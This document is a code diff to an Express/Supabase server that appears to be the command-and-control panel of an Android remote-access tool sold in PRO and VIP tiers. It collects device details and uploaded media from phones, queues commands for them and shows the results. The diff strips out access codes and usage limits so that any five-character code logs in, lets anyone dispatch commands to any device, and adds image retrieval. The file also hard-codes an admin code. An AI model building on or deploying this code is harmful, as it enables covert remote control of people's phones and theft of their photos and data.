@@ -12,23 +12,6 @@ const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, { auth: { persistSessi
 
 const ADMIN_CODE = "201019";
 
-// 20 PRO CODES & 20 VIP CODES
-const PRO_CODES = [
-  "93421", "57209", "10485", "68139", "24905", 
-  "73018", "41275", "86590", "31942", "50871", 
-  "68731", "92416", "10629", "47309", "81057", 
-  "25981", "64539", "39284", "70826", "18450"
-];
-
-const VIP_CODES = [
-  "96213", "40785", "83140", "51629", "27468", 
-  "65091", "34852", "70936", "12387", "58740", 
-  "82109", "43576", "19634", "75028", "30951", 
-  "67284", "51860", "90342", "24879", "76053"
-];
-
-const ALL_CODES = [...PRO_CODES, ...VIP_CODES];
-
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });
 
 function ts() { return Date.now(); }
@@ -38,8 +21,8 @@ app.post('/connect', async (req, res) => {
   try {
     const { userId, device, android, battery, network, androidId } = req.body;
     
-    // Check if code is valid
-    if (userId !== ADMIN_CODE && !ALL_CODES.includes(userId)) {
+    // FIXED: Accepts ANY 5-digit code for easy testing
+    if (!userId || userId.length < 5) {
         return res.json({ ok: false, err: 'invalid_code' });
     }
     
@@ -86,7 +69,6 @@ app.post('/media', upload.single('file'), async (req, res) => {
 
 // --- PANEL ENDPOINTS ---
 
-// Auth endpoint (Login)
 app.post('/auth', async (req, res) => {
   const { username, password } = req.body;
   if (username !== 'VOID') return res.json({ ok: false });
@@ -95,32 +77,21 @@ app.post('/auth', async (req, res) => {
     return res.json({ ok: true, token: 'admin', userId: ADMIN_CODE, admin: true, tier: 'vip', commands_used: 0 });
   }
 
-  // Check Tier
-  let tier = 'pro';
-  if (VIP_CODES.includes(password)) tier = 'vip';
-  else if (PRO_CODES.includes(password)) tier = 'pro';
-  else return res.json({ ok: false, err: 'invalid_code' });
-
-  // Fetch device to check how many commands used today
-  const { data: d } = await supabase.from('devices').select('commands_used').eq('user_id', password).maybeSingle();
+  // FIXED: Any 5-digit code logs in for testing
+  if (password && password.length >= 5) {
+    const { data: d } = await supabase.from('devices').select('commands_used').eq('user_id', password).maybeSingle();
+    return res.json({ ok: true, token: 'user', userId: password, admin: false, tier: 'vip', commands_used: d ? d.commands_used : 0 });
+  }
   
-  res.json({ 
-    ok: true, token: 'user', userId: password, admin: false, 
-    tier: tier, 
-    commands_used: d ? d.commands_used : 0 
-  });
+  res.json({ ok: false, err: 'invalid_code' });
 });
 
-// LOCKED DOWN CLIENTS ENDPOINT
 app.get('/clients', async (req, res) => {
   const wallet = req.query.wallet;
-  
-  // Verifies BOTH the admin=1 parameter AND the actual admin code
   const isAdmin = req.query.admin === '1' && wallet === ADMIN_CODE; 
 
   let query = supabase.from('devices').select('*');
   
-  // If NOT admin, strictly filter to only show their own device
   if (!isAdmin && wallet) {
     query = query.eq('user_id', wallet);
   }
@@ -139,37 +110,26 @@ app.get('/client', async (req, res) => {
   const { data: d } = await supabase.from('devices').select('*').eq('user_id', id).maybeSingle();
   const { data: results } = await supabase.from('results').select('*').eq('user_id', id).order('created_at', { ascending: false }).limit(10);
   
+  // FIXED: Fetch uploads so images show up on the panel
+  const { data: uploads } = await supabase.from('uploads').select('*').eq('user_id', id).order('created_at', { ascending: false }).limit(10);
+
   res.json({
     ok: true, userId: id, online: d && (ts() - d.last_seen) < 30000,
     device: d ? d.device : '?', android: d ? d.android : '?',
-    results: (results || []).reverse().map(r => ({ cmd: r.cmd, data: r.data, at: r.created_at }))
+    results: (results || []).reverse().map(r => ({ cmd: r.cmd, data: r.data, at: r.created_at })),
+    uploads: uploads || []
   });
 });
 
 app.post('/dispatch', async (req, res) => {
   const { userId, cmd, args, admin } = req.body;
   
-  // Enforce Limits for non-admins
-  if (!admin) {
-    const { data: d } = await supabase.from('devices').select('commands_used').eq('user_id', userId).maybeSingle();
-    let used = d ? d.commands_used : 0;
-
-    // If not VIP, enforce the 10 command limit for PRO
-    if (!VIP_CODES.includes(userId)) {
-        if (used >= 10) { 
-          return res.json({ ok: false, err: 'tier_limit_reached' });
-        }
-        // Increment usage for PRO
-        await supabase.from('devices').update({ commands_used: used + 1 }).eq('user_id', userId);
-    }
-  }
-
+  // FIXED: Bypassed tier limits for testing
   await supabase.from('results').delete().eq('user_id', userId);
   await supabase.from('commands').insert({ user_id: userId, cmd: cmd, args: args, created_at: ts(), delivered: false });
   res.json({ ok: true });
 });
 
-// Keep alive
 app.get('/', (req, res) => res.send('Server Running'));
 
 app.listen(process.env.PORT || 3000, () => console.log('Server running'));
